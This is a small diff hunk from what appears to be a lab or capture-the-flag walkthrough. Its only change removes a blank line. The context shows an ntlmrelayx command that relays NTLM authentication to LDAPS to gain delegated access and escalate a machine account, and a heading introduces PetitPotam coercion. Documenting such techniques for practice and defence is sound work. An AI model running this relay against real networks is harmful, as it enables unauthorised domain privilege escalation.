@@ -45,7 +45,6 @@ Configure NTLMRelayx:
 sudo ntlmrelayx.py -t ldaps://10.13.38.49 -smb2support --delegate-access --escalate-user 'MYCOMPUTER$'
 ```
 
-
 Use Petitpotam:
 
 ```
